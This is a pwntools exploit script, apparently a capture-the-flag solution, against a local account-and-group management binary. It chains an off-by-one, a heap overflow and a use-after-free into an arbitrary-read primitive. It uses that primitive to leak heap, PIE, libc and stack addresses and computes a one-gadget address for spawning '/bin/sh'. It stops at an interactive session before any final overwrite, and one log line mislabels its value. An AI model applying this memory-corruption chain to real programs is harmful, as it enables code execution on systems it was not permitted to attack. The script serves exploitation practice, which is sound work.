from pwn import *
context.log_level = "info"

elf = ELF("./bin/account")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = elf.process(env={"LD_PRELOAD": libc.path})


def new_account(type: int, name: bytes) -> None:
    p.send(b"\x00" + p8(type) + name)
    p.recv()


def del_account(idx: int) -> None:
    p.send(b"\x01" + p8(idx))
    p.recv()


def fix_account(idx: int, type: int, name: bytes) -> None:
    p.send(b"\x02" + p8(idx) + p8(type) + name)
    p.recv()


def new_group() -> None:
    p.send(b"\x10")
    p.recv()


def del_group(idx: int) -> None:
    p.send(b"\x11" + p8(idx))
    p.recv()


def add_group(group: int, account: int) -> None:
    p.send(b"\x12" + p8(group) + p8(account))
    p.recv()


def sub_group(group: int, account: int) -> None:
    p.send(b"\x13" + p8(group) + p8(account))
    p.recv()


def list_group(group: int) -> bytes:
    p.send(b"\x14" + p8(group))
    return p.recv()


# group0: For feng shui
new_group()


###################################
### Stage 1: Trigger Off-by-one ###
###################################

# account0: Trigger of Off-by-one
new_account(1, b"AAAA")

# account1: Victim of Off-by-one and Trigger of Heap Overflow
new_account(1, b"BBB")

# account2: Victim of Heap Overflow
new_account(1, b"CCC")

# Trigger Off-by-one
# account1.type: Ascii -> Unicode
fix_account(0, 0, b"\x41\x00\x41\x00")


######################################
### Stage 2: Trigger Heap Overflow ###
######################################

# group1: Handle dangling pointer of account2
new_group()

# Add account2 to group1
# account2.ref_cnt = 2
add_group(1, 2)

# Trigger Heap Overflow
# account2.ref_cnt = 1
fix_account(1, 0, b"\x42\x00\x42\x00\x00\x01")


#######################################
### Stage 3: Trigger Use After Free ###
#######################################

# Delete account2
# -> group0 has dangling pointer
del_account(2)

# group2: Allocated at account2's pointer
new_group()

# Add account1 to group2
# group2.members[0] == account1
add_group(2, 1)

# List group1
# group1.members[0] == account2(freed) == group2
# account2.name == group2.members
# -> Custom heap address leak
heap_base = u64(list_group(1).ljust(0x8, b"\x00")) & 0xFFFFFFFFFFFFF000

print()
log.info(f"heap_base @ 0x{heap_base:x}")
print()


####################
### Stage 4: AAR ###
####################

# Sub account1 from group2
sub_group(2, 1)

# Delete group0 and group2
del_group(0)
del_group(2)

# account2: For AAR
# account2.name: Allocated at account2's pointer
new_account(0, b"D" * 0x16)


def aar(addr: int) -> bytes:
    fake_account = b"\x00\x01" + b"\x01" * 0x6 + p64(addr)
    fix_account(2, 0, fake_account)
    return list_group(1)


group_vtable = u64(aar(heap_base + 0xFD).ljust(0x8, b"\x00"))
pie_base = group_vtable - 0x6010
read_got = pie_base + elf.got["read"]

log.info(f"pie_base @ {pie_base:#x}")
log.info(f"group_vtable @ {group_vtable:#x}")
log.info(f"read_got @ {group_vtable:#x}")
print()

libc_read = u64(aar(read_got).ljust(0x8, b"\x00"))
libc_base = libc_read - libc.sym["read"]
libc_environ = libc_base + libc.sym["environ"]
libc_one = libc_base + 0xebc81
"""
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
"""

log.info(f"libc_base @ {libc_base:#x}")
log.info(f"libc_read @ {libc_read:#x}")
log.info(f"libc_environ @ {libc_environ:#x}")
log.info(f"libc_one @ {libc_one:#x}")
print()

stack_leak = u64(aar(libc_environ).ljust(0x8, b"\x00"))
target = stack_leak - 0x250

log.info(f"stack_leak @ {stack_leak:#x}")
log.info(f"target @ {target:#x}")
print()

p.interactive()
p.close()
